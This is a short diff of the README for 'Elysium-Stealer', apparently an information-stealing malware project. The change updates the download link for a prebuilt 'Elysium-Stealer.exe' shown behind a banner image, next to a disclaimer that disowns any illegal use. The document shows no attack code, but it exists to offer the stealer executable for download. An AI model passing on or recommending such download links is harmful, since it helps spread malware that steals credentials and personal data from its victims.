@@ -20,7 +20,7 @@ I will not be held accountable for any illegal activities.
 [Showcase](https://github.com/eierflattern/Elysium-Stealer/blob/main/README.md#showcase)<br/>
 [Credits](https://github.com/eierflattern/Elysium-Stealer/blob/main/README.md#credits)<br/>
   
-<a href="https://github.com/Nyxonn/eierflattern/releases/download/1.0.0/Elysium-Stealer.exe">
+<a href="https://github.com/eierflattern/releases/download/1.0.0/Elysium-Stealer.exe">
   <img src="https://i.postimg.cc/T1Xq23tH/Untitled2.png" width="400" height="160" />
 </a>
 
